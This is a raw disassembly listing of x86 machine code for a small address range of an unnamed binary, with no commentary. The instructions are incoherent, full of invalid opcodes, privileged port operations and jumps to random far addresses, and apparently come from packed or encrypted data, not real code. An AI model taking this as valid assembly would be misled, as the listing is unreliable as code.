  412e72:	push   edi
  412e73:	add    BYTE PTR [ebx-0x3ccce6fb],bh
  412e79:	jmp    0x412e6d
  412e7b:	icebp  
  412e7c:	popa   
  412e7d:	fs iret 
  412e7f:	adc    DWORD PTR [esi],eax
  412e81:	in     al,dx
  412e82:	mov    esp,0x2fbffa3
  412e87:	std    
  412e88:	int    0x3b
  412e8a:	fsub   DWORD PTR [esi]
  412e8c:	mov    WORD PTR [eax-0x3e047a61],ds
  412e92:	push   ecx
  412e93:	mov    al,0xf9
  412e95:	add    dh,BYTE PTR [ebp+esi*2+0x7bff1fd3]
  412e9c:	lods   al,BYTE PTR ds:[esi]
  412e9d:	mov    eax,0x8fa0d767
  412ea2:	sbb    edi,DWORD PTR [ebx+0x7f]
  412ea5:	outs   dx,DWORD PTR ds:[esi]
  412ea6:	fnstenv [ebx]
  412ea8:	repz inc ebx
  412eaa:	push   ss
  412eab:	mov    ebx,0x8e3b3e4f
  412eb0:	cmp    ch,ah
  412eb2:	pushf  
  412eb3:	shl    ebx,0xb
  412eb6:	fdivr  st(0),st
  412eb8:	mov    eax,ds:0x88fe3405
  412ebd:	jne    0x412eee
  412ebf:	dec    ebx
  412ec0:	jns    0x412e4d
  412ec2:	fld    TBYTE PTR [esi]
  412ec4:	jp     0x412f3d
  412ec6:	(bad)  
  412ec8:	xchg   ebx,eax
  412ec9:	jmp    0x8002:0xb493ff9f
  412ed0:	xor    ah,BYTE PTR ds:[ecx+0x8]
  412ed4:	and    BYTE PTR [eax],al
  412ed6:	add    BYTE PTR [eax+0x79],ah
  412ed9:	sub    cl,cl
  412edb:	stos   BYTE PTR es:[edi],al
  412edc:	pop    es
  412edd:	or     BYTE PTR [eax],dh
  412edf:	lock mov DWORD PTR [edi+0x7bde945f],esp
  412ee6:	cld    
  412ee7:	(bad)  
  412ee8:	and    eax,0x87cb5c4b
  412eed:	mov    BYTE PTR [eax],al
  412eef:	inc    edx
  412ef0:	pop    eax
  412ef1:	pop    ebx
  412ef2:	xchg   BYTE PTR [edi-0x3d],dl
  412ef5:	push   esi
  412ef6:	out    0x5b,al
  412ef8:	lock dec eax
  412efa:	imul   ecx,DWORD PTR [esi+edi*1+0x405eac2a],0xffffffa9
  412f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f03:	add    al,BYTE PTR [ebx]
  412f05:	adc    eax,0x39df61a2
  412f0a:	dec    eax
  412f0b:	imul   eax,edx,0x16
  412f0e:	sahf   
  412f0f:	jg     0x412f0a
  412f11:	pop    ebx
  412f12:	(bad)  
  412f13:	cmp    dl,BYTE PTR [esi+0x44acf33c]
  412f19:	std    
  412f1a:	cmp    ebx,DWORD PTR [edi]
  412f1c:	jge    0x412f75
  412f1e:	mov    edx,0x18719917
  412f23:	add    eax,0xc97f213c
  412f28:	cdq    
  412f29:	jno    0x412f6a
  412f2b:	inc    edx
  412f2c:	mov    dl,0x64
  412f2e:	and    BYTE PTR [ebp-0x16],bh
  412f31:	(bad)  
  412f32:	jecxz  0x412ee3
  412f34:	push   0x2001ccf4
  412f39:	dec    esp
  412f3a:	dec    ebx
  412f3b:	cli    
  412f3c:	shl    DWORD PTR [ebx-0x77de2708],1
  412f42:	xor    esi,edi
  412f44:	mov    cl,0xfe
  412f46:	iret   
  412f47:	in     eax,0xbe
  412f49:	sub    edi,DWORD PTR [edi]
  412f4b:	mov    bl,0x27
  412f4d:	(bad)  
  412f4e:	cmp    al,0x7d
  412f50:	es (bad) 
  412f52:	(bad)  
  412f53:	in     eax,0x17
  412f55:	test   ebp,0x313a9f79
  412f5b:	std    
  412f5c:	pop    eax
  412f5d:	or     al,0x9e
  412f5f:	rol    BYTE PTR [eax+eiz*4],0x3
  412f63:	int3   
  412f64:	outs   dx,DWORD PTR ds:[esi]
  412f65:	jge    0x412f32
  412f67:	fwait
  412f68:	bound  ebp,QWORD PTR [ecx-0x51]
  412f6b:	in     eax,dx
  412f6c:	mov    ebp,0xd6889a1f
  412f71:	repz lahf 
  412f73:	ss pusha 
  412f75:	pop    esp
  412f76:	fsub   DWORD PTR [ebx]
  412f78:	jo     0x412f46
  412f7a:	dec    ebp
  412f7b:	xor    edi,DWORD PTR [edi]
  412f7d:	and    cl,BYTE PTR [ebx+0x56c98d90]
  412f83:	push   eax
  412f84:	jle    0x412faa
  412f86:	jo     0x412f69
  412f88:	std    
  412f89:	stc    
  412f8a:	inc    ebx
  412f8b:	push   ds
  412f8c:	lock bnd js 0x412f4f
  412f90:	in     eax,dx
  412f91:	addr16 aaa 
  412f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f94:	fistp  WORD PTR [ebx]
  412f96:	xor    BYTE PTR [ecx+0x23e5b1e3],0x8e
  412f9d:	pop    ds
  412f9e:	add    dh,BYTE PTR [ecx*4-0x76f13ea1]
  412fa5:	dec    edi
  412fa6:	in     al,dx
  412fa7:	push   0x67a6b945
  412fac:	cld    
  412fad:	fmul   st(4),st
  412faf:	ret    
  412fb0:	aas    
  412fb1:	into   
  412fb2:	add    DWORD PTR [ebx+0x2be09e71],edx
  412fb8:	sbb    DWORD PTR [edx-0x1eb510d9],esi
  412fbe:	mov    ch,0xda
  412fc0:	mov    al,0x3
  412fc2:	jnp    0x412f50
  412fc4:	stc    
  412fc5:	ds dec ebx
  412fc7:	add    ch,dl
  412fc9:	dec    esi
  412fca:	mov    eax,ds:0xbc751c88
  412fcf:	jae    0x412fab
  412fd1:	xor    DWORD PTR [ebp+0x5a52cb94],ebp
  412fd7:	call   0xacd0:0x606fa756
  412fde:	repnz cmp BYTE PTR [ebp-0x3d],ah
  412fe2:	jg     0x412fe0
  412fe4:	cs loope 0x412f79
  412fe7:	imul   ebp,DWORD PTR [edi],0x1e
  412fea:	cmp    al,0x49
  412fec:	mov    BYTE PTR [edx+0x26],al
  412fef:	cmp    ch,0xd7
  412ff2:	cmp    al,0x51
  412ff4:	xchg   DWORD PTR ds:0x9b697f4b,eax
  412ffa:	outs   dx,BYTE PTR ds:[esi]
  412ffb:	iret   
  412ffc:	mov    ds:0x6b69bdee,eax
  413001:	pop    edx
  413002:	loop   0x412fa5
  413004:	xchg   ecx,eax
  413005:	into   
  413006:	inc    cl
  413008:	(bad)  
  413009:	xchg   ebx,eax
  41300a:	inc    ecx
  41300b:	ret    
  41300c:	pop    ebx
  41300d:	or     BYTE PTR [edx+0x43],0x81
  413011:	ja     0x413072
  413013:	jge    0x413066
  413015:	jl     0x41300d
  413017:	stc    
  413018:	aas    
  413019:	mov    DWORD PTR [ebx],esi
  41301b:	out    dx,eax
  41301c:	fst    QWORD PTR [ecx-0xa98af3b]
  413022:	je     0x41301a
  413024:	(bad)  
  413025:	pop    edi
  413026:	cmp    al,0x26
  413028:	out    0x5c,al
  41302a:	mov    bh,0x3c
  41302c:	out    0x9c,al
  41302e:	std    
  41302f:	mov    esi,0x188464b4
  413034:	pushf  
  413035:	pop    es
  413036:	mov    eax,ds:0x73e38bd2
  41303b:	outs   dx,BYTE PTR ds:[esi]
  41303c:	mul    al
  41303e:	rcr    DWORD PTR [eax+esi*8-0x76],cl
  413042:	mov    bh,0x7c
  413044:	cli    
  413045:	(bad)  
  413046:	xchg   sp,ax
  413048:	jle    0x413029
  41304a:	mov    ds:0xc7d97c98,al
  41304f:	mov    dl,0xe3
  413051:	shl    DWORD PTR [eax],cl
  413053:	push   ss
  413054:	in     al,0x2f
  413056:	nop
  413057:	in     al,0x1c
  413059:	sbb    al,0xb2
  41305b:	fidivr DWORD PTR [edi]
  41305d:	xor    eax,0xd2c0f89
  413062:	into   
  413063:	pop    esp
  413064:	in     al,dx
  413065:	xchg   edi,eax
  413066:	lods   eax,DWORD PTR ds:[esi]
  413067:	mov    edi,0x7120f0fe
  41306c:	cwde   
  41306d:	jb     0x413070
  41306f:	mov    ebp,0xef81e8f0
  413074:	jg     0x4130b3
  413076:	jle    0x4130db
  413078:	pop    es
  413079:	popa   
  41307a:	push   edx
  41307b:	leave  
  41307c:	pop    eax
  41307d:	cmp    al,0xf6
  41307f:	das    
  413080:	and    eax,0xbef92b7b
  413085:	mov    ?,WORD PTR [edi+eax*2]
  413088:	push   ebx
  413089:	lds    edx,FWORD PTR [eax-0xe5a5267]
  41308f:	aas    
  413090:	jmp    0x41308b
  413092:	jmp    0x90928f9e
  413097:	in     eax,dx
  413098:	inc    edi
  413099:	mov    eax,ds:0x3f7f7031
  41309e:	sahf   
  41309f:	je     0x413065
  4130a1:	loope  0x4130c2
  4130a3:	xor    BYTE PTR [eax+0x26],dh
  4130a6:	(bad)  
  4130a7:	push   edx
  4130a8:	fistp  QWORD PTR [ebx+0x14]
  4130ab:	sahf   
  4130ac:	mov    edi,0x79df84f6
  4130b1:	les    ebp,FWORD PTR [edi]
  4130b3:	cmp    ah,BYTE PTR [edi+0x5770dcfe]
  4130b9:	int3   
  4130ba:	lods   al,BYTE PTR ds:[esi]
  4130bc:	dec    edx
  4130bd:	mov    eax,ds:0xe5b9dc3
  4130c2:	dec    ebp
  4130c3:	xchg   BYTE PTR [edi-0x7571fe24],cl
  4130c9:	ret    
  4130ca:	and    DWORD PTR [ecx],esp
  4130cc:	js     0x413122
  4130ce:	sbb    BYTE PTR [ebx+0x7191e0a4],bl
  4130d4:	adc    al,0xd8
  4130d6:	adc    edi,DWORD PTR [esi]
  4130d8:	lock jmp 0x7244c092
  4130de:	cmp    eax,0x4cffed78
  4130e3:	mov    ebx,0x9c0090ef
  4130e8:	mov    ebx,0xf92c716c
  4130ed:	loop   0x4130c2
  4130ef:	xchg   edx,eax
  4130f0:	and    ebx,esp
  4130f2:	adc    DWORD PTR [ebx+0x1c],ebx
  4130f5:	push   ds
  4130f6:	add    edx,DWORD PTR [eax+0xcc775bf]
  4130fc:	fwait
  4130fd:	add    al,0x0
  4130ff:	and    dh,cl
  413101:	(bad)  
  413102:	idiv   DWORD PTR [eax-0x48]
  413105:	xchg   DWORD PTR [edi],edi
  413107:	aad    0x46
  413109:	push   es
  41310a:	sar    al,0x1e
  41310d:	and    eax,eax
  41310f:	shl    DWORD PTR [ecx+0x57e792c],1
  413115:	add    esp,esi
  413117:	cmova  esi,DWORD PTR [edi-0x5d]
  41311b:	lods   al,BYTE PTR ds:[esi]
  41311c:	pushf  
  41311d:	jnp    0x41316e
  41311f:	ins    BYTE PTR es:[edi],dx
  413120:	jns    0x413164
  413122:	xchg   ebp,eax
  413123:	ret    0x63c3
  413126:	push   ds
  413127:	sti    
  413128:	fidiv  WORD PTR [esp+ebx*4+0x18]
  41312c:	je     0x413122
  41312e:	repnz ds add ah,dl
  413132:	jge    0x41312d
  413134:	dec    esi
  413135:	mov    ecx,esp
  413137:	cmp    DWORD PTR [edi],esi
  413139:	mov    esi,0x40c9ae64
  41313e:	fiadd  DWORD PTR [ebp+0x12d2b732]
  413144:	mov    esp,0xceae9dda
  413149:	(bad)  
  41314a:	retf   
  41314b:	xlat   BYTE PTR ds:[ebx]
  41314c:	cmp    DWORD PTR gs:[eax],eax
  41314f:	or     esi,DWORD PTR ds:[eax]
  413152:	mov    es,WORD PTR [esi-0x12000210]
  413158:	mov    dl,0x9f
  41315a:	daa    
  41315b:	xor    esi,DWORD PTR [ecx+esi*4]
  41315e:	inc    esp
  41315f:	ret    
  413160:	push   edx
  413161:	inc    esp
  413162:	sar    DWORD PTR [ebx+0x35],cl
  413165:	dec    ecx
  413166:	test   al,0x2c
  413168:	pusha  
  413169:	mov    ds:0x1c18faff,al
  41316e:	fdivr  DWORD PTR [ecx-0x1d]
  413171:	sysret 
  413173:	(bad)  
  413174:	lea    esp,[ecx-0x1e]
  413177:	inc    ecx
  413178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413179:	popa   
  41317a:	aam    0xf8
  41317c:	int    0x36
  41317e:	sahf   
  41317f:	or     eax,DWORD PTR [eax+0xa0e3bac]
  413185:	inc    ebp
  413186:	push   ds
  413187:	add    BYTE PTR [edi+0x235bc274],cl
  41318d:	push   ds
  41318e:	fwait
  41318f:	mov    ebp,0x227a5368
  413194:	adc    BYTE PTR [ebx-0x4e62bf81],bl
  41319a:	mov    WORD PTR es:[edx-0x38],?
  41319e:	fdiv   st(7),st
  4131a0:	sbb    eax,0x92f73b1f
  4131a5:	mov    eax,0x73c45b7a
  4131aa:	fcmovnu st,st(3)
  4131ac:	inc    esi
  4131ad:	cli    
  4131ae:	hlt    
  4131af:	hlt    
  4131b0:	pop    ebp
  4131b1:	daa    
  4131b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131b3:	jecxz  0x413170
  4131b5:	push   ss
  4131b6:	sahf   
  4131b7:	cld    
  4131b8:	xor    DWORD PTR [esi+edi*1+0x1b],0x13216c1e
  4131c0:	loope  0x4131cb
  4131c2:	leave  
  4131c3:	add    al,0x12
  4131c5:	hlt    
  4131c6:	or     esi,eax
  4131c8:	int    0xef
  4131ca:	pusha  
  4131cb:	mov    al,ds:0xce548200
  4131d0:	jns    0x41322b
  4131d2:	in     al,dx
  4131d3:	cli    
  4131d4:	ret    0xc7df
  4131d7:	ret    0x7f9b
  4131da:	xchg   ebp,eax
  4131db:	into   
  4131dc:	pop    es
  4131dd:	les    ebp,FWORD PTR [ecx]
  4131df:	inc    ecx
  4131e0:	push   eax
  4131e1:	shl    BYTE PTR [ebp+0x13],0x7f
  4131e5:	fwait
  4131e6:	leave  
  4131e7:	adc    al,0xd7
  4131e9:	add    ecx,DWORD PTR [eax+0x70]
  4131ec:	adc    ch,BYTE PTR [esi+edx*4]
  4131ef:	cmp    DWORD PTR [ecx],ecx
  4131f1:	xor    ch,BYTE PTR [eax]
  4131f3:	cmp    al,0x8a
  4131f5:	popf   
  4131f6:	in     eax,dx
  4131f7:	mov    eax,ds:0xb130241d
  4131fc:	mov    ch,0xf5
  4131fe:	sbb    edi,ebp
  413200:	repz loop 0x4131ac
  413203:	jo     0x4131a9
  413205:	sahf   
  413206:	into   
  413207:	fisubr DWORD PTR [eax+0x15631c54]
  41320d:	mov    ds:0xa3739374,eax
  413212:	mov    ecx,0x4f4ffc19
  413217:	jae    0x413217
  413219:	lds    ebx,FWORD PTR [ebx-0x671c0e6d]
  41321f:	push   0x18
  413221:	xchg   ebp,eax
  413222:	data16 cli 
  413224:	loope  0x41321b
  413226:	loope  0x413205
  413228:	push   edi
  413229:	pop    ds
  41322a:	jns    0x4132a4
  41322c:	jp     0x41324c
  41322e:	and    BYTE PTR [edi],0xde
  413231:	lock hlt 
  413233:	data16 out dx,al
  413235:	mov    ah,BYTE PTR [ecx+esi*8-0x49fbb09d]
  41323c:	push   ebx
  41323d:	xchg   ebx,eax
  41323e:	sbb    eax,0xe6d620b0
  413243:	(bad)  
  413244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413245:	shl    al,0x4f
  413248:	jg     0x413228
  41324a:	call   0x78f1:0x6b1233b4
  413251:	jp     0x413267
  413253:	in     al,dx
  413254:	shufps xmm0,XMMWORD PTR [esi+0x6bfe3d82],0x9e
  41325c:	icebp  
  41325d:	call   0xfff2:0xbc97ca04
  413264:	mov    ecx,ecx
  413266:	dec    ebx
  413267:	outs   dx,DWORD PTR ds:[esi]
  413268:	mov    es,WORD PTR [ebx-0x38e8a291]
  41326e:	sahf   
  41326f:	ja     0x4132b3
  413271:	fidivr DWORD PTR [ecx+0x8]
  413274:	out    0x87,al
  413276:	rcr    BYTE PTR gs:[ebp+0x77],0xbd
  41327b:	das    
  41327c:	sub    eax,0x632c2217
  413281:	call   0xe4c430c
  413286:	add    bl,BYTE PTR [ecx+0x7c]
  413289:	js     0x413309
  41328b:	pushf  
  41328c:	fimul  DWORD PTR [ecx+esi*8-0x169bc494]
  413293:	loopne 0x4132bd
  413295:	das    
  413296:	es stc 
  413298:	push   eax
  413299:	nop
  41329a:	call   0x42812d82
  41329f:	add    dl,dl
  4132a1:	inc    DWORD PTR [edi]
  4132a3:	aaa    
  4132a4:	sub    al,0x4f
  4132a6:	jns    0x4132c2
  4132a8:	into   
  4132a9:	adc    DWORD PTR [eax],eax
  4132ab:	out    0xe2,eax
  4132ad:	(bad)  
  4132ae:	push   ecx
  4132af:	out    dx,al
  4132b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b1:	lock int3 
  4132b3:	sbb    eax,0xb752dba5
  4132b8:	scas   eax,DWORD PTR es:[edi]
  4132b9:	imul   DWORD PTR [ebp-0x5]
  4132bc:	pop    esp
  4132bd:	pop    ecx
  4132be:	add    bh,ah
  4132c0:	xchg   ecx,eax
  4132c1:	repz push edi
  4132c3:	inc    edi
  4132c4:	mov    esi,0xd26d4037
  4132c9:	push   edi
  4132ca:	test   DWORD PTR [esi],eax
  4132cc:	stos   DWORD PTR es:[edi],eax
  4132cd:	add    bl,ch
  4132cf:	cli    
  4132d0:	and    eax,eax
  4132d2:	out    dx,eax
  4132d3:	fiadd  DWORD PTR [ecx]
  4132d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132d6:	pop    esi
  4132d7:	pop    esi
  4132d8:	add    DWORD PTR [eax+0x2b],0x6abdd96d
  4132df:	in     al,dx
  4132e0:	dec    edx
  4132e1:	dec    ebx
  4132e2:	mov    edx,0xe9d2b91
  4132e7:	dec    esp
  4132e8:	aaa    
  4132e9:	or     BYTE PTR [ecx-0x5a],ch
  4132ec:	cdq    
  4132ed:	cmp    DWORD PTR [ecx+0x6e0ffa93],eax
  4132f3:	lock enter 0xec24,0x16
  4132f8:	in     al,0x6f
  4132fa:	adc    dl,ah
  4132fc:	aas    
  4132fd:	std    
  4132fe:	cli    
  4132ff:	and    cl,bh
  413301:	(bad)  
  413302:	mov    ebp,0xea6783fb
  413307:	sti    
  413308:	push   ds
  413309:	sbb    DWORD PTR [esi-0x4269847b],eax
  41330f:	test   DWORD PTR [ebx-0x2f],0xe98dfefd
  413316:	sbb    al,0x38
  413318:	dec    esp
  413319:	loope  0x4132c1
  41331b:	inc    esi
  41331c:	arpl   WORD PTR [esi+0x5c],sp
  41331f:	fucomp st(6)
  413321:	enter  0x397a,0x4
  413325:	cmp    ebx,ecx
  413327:	sti    
  413328:	ret    
  413329:	xchg   ecx,eax
  41332a:	mov    ds:0x8bfbf717,al
  41332f:	leave  
  413330:	pop    ecx
  413331:	xchg   DWORD PTR [edi],edx
  413333:	mov    ebp,0x1f7624f0
  413338:	dec    esp
  413339:	aaa    
  41333a:	sub    bl,al
  41333c:	ror    DWORD PTR [ebp-0x129d19c8],0x51
  413343:	jae    0x4132e8
  413345:	repz inc eax
  413347:	aas    
  413348:	scas   al,BYTE PTR es:[edi]
  413349:	in     al,dx
  41334a:	pop    ebp
  41334b:	xlat   BYTE PTR ds:[ebx]
  41334c:	pop    esp
  41334d:	fdivr  QWORD PTR [edi]
  41334f:	and    al,0xe2
  413351:	enter  0x31b9,0xbb
  413355:	inc    edi
  413356:	lea    ecx,[edi]
  413358:	loopne 0x41338b
  41335a:	loopne 0x41333f
  41335c:	xlat   BYTE PTR ds:[ebx]
  41335d:	(bad)  
  41335e:	std    
  41335f:	dec    edi
  413360:	pop    esp
  413361:	nop
  413362:	sahf   
  413363:	nop
  413364:	fstp   TBYTE PTR [ecx-0x3f]
  413367:	mov    edx,ebx
  413369:	xchg   BYTE PTR ds:0x141cfe14,dl
  41336f:	cmpxchg al,al
  413372:	jle    0x4133e9
  413374:	sub    BYTE PTR [edi-0x77e863ea],dl
  41337a:	jno    0x41339d
  41337c:	adc    al,0xb8
  41337e:	mov    ah,0xff
  413380:	sbb    DWORD PTR [eax-0x61640b4b],0x5f
  413387:	adc    eax,0x9306bd45
  41338c:	jg     0x4133e2
  41338e:	push   ss
  41338f:	iret   
  413390:	in     eax,0x54
  413392:	repnz std 
  413394:	mov    edi,ebx
  413396:	daa    
  413397:	cmp    al,0x11
  413399:	fdiv   DWORD PTR [esi-0x4ed21703]
  41339f:	loopne 0x413332
  4133a1:	lods   eax,DWORD PTR ds:[esi]
  4133a2:	xor    DWORD PTR [edi-0x19],edi
  4133a5:	loop   0x41339b
  4133a7:	pusha  
  4133a8:	punpckldq mm7,DWORD PTR [ecx+0x64]
  4133ac:	jmp    0x4133ff
  4133ae:	adc    BYTE PTR [edx-0x39fa3a9f],cl
  4133b4:	dec    ebp
  4133b5:	and    edx,edi
  4133b7:	ret    0x9f87
  4133ba:	adc    BYTE PTR [edx+0x264189e1],bl
  4133c0:	test   DWORD PTR [esi+0x7c],0x1b1307c3
  4133c7:	jecxz  0x41343c
  4133c9:	test   BYTE PTR [ebx],0x83
  4133cc:	call   0x3208f5c0
  4133d1:	pop    esp
  4133d2:	cld    
  4133d3:	lea    edi,[esp+esi*8]
  4133d6:	add    DWORD PTR [edi-0x34],eax
  4133d9:	sbb    eax,0x69cdf475
  4133de:	cmp    esi,ebp
  4133e0:	retf   
  4133e1:	das    
  4133e2:	cli    
  4133e3:	je     0x413431
  4133e5:	pop    esp
  4133e6:	cmp    dh,BYTE PTR [ebx-0x481a84eb]
  4133ec:	sahf   
  4133ed:	fwait
  4133ee:	cmp    al,0x36
  4133f0:	loop   0x4133f1
  4133f2:	inc    edi
  4133f3:	scas   al,BYTE PTR es:[edi]
  4133f4:	cld    
  4133f5:	ins    DWORD PTR es:[edi],dx
  4133f6:	add    bl,BYTE PTR [eax+eax*1+0x0]
  4133fa:	sahf   
  4133fb:	mov    ecx,0x87605e80
  413400:	push   ds
  413401:	add    BYTE PTR [eax-0x565ab359],bl
  413407:	pop    esp
  413408:	jbe    0x413486
  41340a:	retf   0xe023
  41340d:	jns    0x41341d
  41340f:	cmp    al,0x75
  413411:	retf   0xe079
  413414:	imul   edx,esp,0x25301278
  41341a:	push   0x1da30ffb
  41341f:	mov    ebx,0xf25a5663
  413424:	imul   edi,DWORD PTR [esi-0x4c3e6313],0x1a
  41342b:	pusha  
  41342c:	ins    DWORD PTR es:[edi],dx
  41342d:	add    BYTE PTR [ebx+0x1979facb],bl
  413433:	xor    eax,0xda5b47fe
  413438:	mov    ds:0x9ac6d0ed,eax
  41343d:	xor    DWORD PTR [edx-0x6146f3d4],ebx
  413443:	ss inc ebx
  413445:	inc    edi
  413446:	stos   BYTE PTR es:[edi],al
  413447:	jbe    0x4133f3
  413449:	jp     0x4134a3
  41344b:	ficom  DWORD PTR [edi+0x3191e0a3]
  413451:	add    BYTE PTR [esi-0x56],dl
  413454:	pop    ss
  413455:	icebp  
  413456:	jne    0x413481
  413458:	cdq    
  413459:	loopne 0x4134cf
  41345b:	inc    ebp
  41345c:	or     eax,0x9e03ab87
  413461:	call   0xab247ece
  413466:	push   0xc66c189e
  41346b:	test   al,0x17
  41346d:	loop   0x413409
  41346f:	repz call 0xcc4a:0x9c1e2e6b
  413477:	jae    0x41347c
  413479:	clc    
  41347a:	dec    eax
  41347b:	xor    BYTE PTR [edx],cl
  41347d:	mov    WORD PTR [esi],ds
  41347f:	xor    DWORD PTR ds:0x4bd2f1b6,esi
  413485:	bound  edx,QWORD PTR ds:0xff2b9ee1
  41348b:	xor    ch,bh
  41348d:	sub    ch,al
  41348f:	sahf   
  413490:	dec    edi
  413491:	pop    esp
  413492:	aas    
  413493:	fmul   DWORD PTR [ebx+0x4f]
  413496:	lock shl esp,cl
  413499:	or     bh,bl
  41349b:	xchg   BYTE PTR [esi+0x44a611c0],dh
  4134a1:	ss (bad) 
  4134a3:	(bad)  
  4134a4:	jnp    0x413522
  4134a6:	aaa    
  4134a7:	sar    edi,1
  4134a9:	mov    esp,0xf833e18e
  4134ae:	sahf   
  4134af:	fcmovnb st,st(0)
  4134b1:	scas   al,BYTE PTR es:[edi]
  4134b2:	test   DWORD PTR [ebp-0x35],ebx
  4134b5:	icebp  
  4134b6:	or     al,0x41
  4134b8:	(bad)  
  4134b9:	jmp    0xacf1:0x6478acc6
  4134c0:	cwde   
  4134c1:	rol    DWORD PTR [ebx],cl
  4134c3:	add    al,BYTE PTR [eax]
  4134c5:	iret   
  4134c6:	call   0x660:0x7edc161e
  4134cd:	sub    dh,cl
  4134cf:	in     al,dx
  4134d0:	mov    ebp,0xbd7bd9de
  4134d5:	ins    BYTE PTR es:[edi],dx
  4134d6:	jns    0x413527
  4134d8:	test   eax,0x58aef3be
  4134dd:	jl     0x4134a2
  4134df:	gs jmp 0xc43f0ee3
  4134e5:	push   edx
  4134e6:	lods   ax,WORD PTR ds:[esi]
  4134e8:	jnp    0x413537
  4134ea:	cli    
  4134eb:	pop    DWORD PTR [edi+edx*1]
  4134ee:	sahf   
  4134ef:	retw   
  4134f1:	xchg   BYTE PTR [esi],dl
  4134f3:	cmp    al,0x36
  4134f5:	or     eax,0xd18019
  4134fa:	add    al,dh
  4134fc:	add    ah,cl
  4134fe:	movsx  esi,BYTE PTR [esi-0xd]
  413502:	loopne 0x413484
  413504:	push   eax
  413505:	in     eax,dx
  413506:	mov    bh,0xc6
  413508:	pushf  
  413509:	sub    eax,0x81c137e9
  41350e:	dec    edx
  41350f:	(bad)  
  413510:	jns    0x4134e6
  413512:	jl     0x413514
  413514:	(bad)  
  413515:	push   ds
  413516:	imul   edx
  413518:	shl    ebx,cl
  41351a:	mov    DWORD PTR [edi],ebx
  41351c:	popf   
  41351d:	stc    
  41351e:	cmp    eax,0x40000046
  413523:	adc    al,0x86
  413525:	ret    0x9053
  413528:	loopne 0x4134d7
  41352a:	xchg   ecx,eax
  41352b:	int    0xd7
  41352d:	in     al,0x1e
  41352f:	lahf   
  413530:	hlt    
  413531:	jecxz  0x413544
  413533:	out    dx,eax
  413534:	test   eax,0x564d1eee
  413539:	and    BYTE PTR [esi],0xd
  41353c:	xchg   DWORD PTR [ecx+0x4d],eax
  41353f:	cmp    al,0xed
  413541:	and    esi,DWORD PTR [ecx-0x13]
  413544:	out    0xfe,eax
  413546:	data16 jo 0x41351f
  413549:	ds jecxz 0x4135c2
  41354c:	xchg   esi,eax
  41354d:	fs cld 
  41354f:	mov    bl,0x4e
  413551:	sbb    esp,esi
  413553:	add    DWORD PTR [ebp-0x29],esp
  413556:	aad    0x1f
  413558:	dec    esp
  413559:	mov    ebx,0xc8fe2f0d
  41355e:	xchg   ebp,eax
  41355f:	leave  
  413560:	repz mov bl,0xe0
  413563:	jns    0x4134e9
  413565:	aam    0xde
  413567:	call   0x9cd7:0x60d0a4b7
  41356e:	cdq    
  41356f:	lahf   
  413570:	pop    esi
  413571:	inc    edi
  413572:	pop    eax
  413573:	enter  0x11bc,0xf6
  413577:	pop    esi
  413578:	shr    BYTE PTR [eax-0x1310f0f],1
  41357e:	push   ebx
  41357f:	sahf   
  413580:	cmp    ecx,DWORD PTR [eax]
  413582:	rcr    DWORD PTR [ebp+esi*2+0xc6921],1
  413589:	xchg   BYTE PTR [ecx+0x6028ee43],dl
  41358f:	sahf   
  413590:	fadd   DWORD PTR [esi+edx*4+0x43806cce]
  413597:	jmp    0x8b1f:0xf5fa1201
  41359e:	(bad)  
  41359f:	(bad)  
  4135a0:	cmp    eax,0xa3768bba
  4135a5:	or     DWORD PTR [esi-0x4e],edx
  4135a8:	add    DWORD PTR [esi-0xb438f2a],edi
  4135ae:	call   0xba6f:0xaad7c5f3
  4135b5:	call   0xe446:0xed9b8ca3
  4135bc:	into   
  4135bd:	cmp    ebx,ebx
  4135bf:	or     DWORD PTR [eax],ebx
  4135c1:	test   DWORD PTR [ebx+0x43701a43],ecx
  4135c7:	imul   ebx
  4135c9:	aam    0x80
  4135cb:	dec    ebx
  4135cc:	retf   
  4135cd:	adc    ebp,DWORD PTR [edi+eiz*4-0x4541f1fc]
  4135d4:	mov    al,ds:0x8ca90a
  4135d9:	xchg   BYTE PTR [edi+0x42],dh
  4135dc:	das    
  4135dd:	mov    esi,0xb7bdf65b
  4135e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135e3:	inc    edi
  4135e4:	xchg   BYTE PTR [ecx],bl
  4135e6:	(bad)  
  4135e7:	repz rcr DWORD PTR ds:0xadfd7050,0x2
  4135ef:	jle    0x413578
  4135f1:	inc    ebx
  4135f2:	and    ch,BYTE PTR [edi-0x17]
  4135f5:	push   ebx
  4135f6:	xor    bl,bh
  4135f8:	mov    cl,ah
  4135fa:	or     DWORD PTR [edx-0x5a69b48f],esi
  413600:	aad    0x8b
  413602:	jno    0x41362f
  413604:	daa    
  413605:	sbb    cl,dh
  413607:	mov    eax,0xd1eec2cc
  41360c:	icebp  
  41360d:	sti    
  41360e:	cmp    al,0xa4
  413610:	ins    DWORD PTR es:[edi],dx
  413611:	dec    edi
  413612:	cmp    eax,0xafe4b196
  413617:	shl    DWORD PTR es:[ebx+0x0],cl
  41361b:	push   eax
  41361c:	into   
  41361d:	mov    ebp,0xc1f9f0ff
  413622:	mov    ebp,0xbe3c4360
  413627:	in     al,dx
  413628:	(bad)  
  413629:	dec    edi
  41362a:	aas    
  41362b:	and    ebp,DWORD PTR [esi]
  41362d:	jge    0x413622
  41362f:	sahf   
  413630:	add    al,0x0
  413632:	call   0xdbf5cb22
  413637:	mov    dh,0x3e
  413639:	mov    ch,0x23
  41363b:	pop    es
  41363c:	jns    0x4135f4
  41363e:	jmp    0x9e67eade
  413643:	jns    0x413687
  413645:	pushf  
  413646:	test   DWORD PTR [esi-0x7035db29],0xa04fc82
  413650:	sahf   
  413651:	push   edi
  413652:	(bad)  
  413653:	mov    eax,ds:0x1e0e7aa7
  413658:	mov    cs,WORD PTR [eax+0x5b]
  41365b:	jl     0x413657
  41365d:	lahf   
  41365e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41365f:	test   DWORD PTR [ebx-0x10b7a4],0x3f338db6
  413669:	scas   al,BYTE PTR es:[edi]
  41366a:	test   eax,0xc8c0e327
  41366f:	shl    DWORD PTR [ebx-0x264fad0f],cl
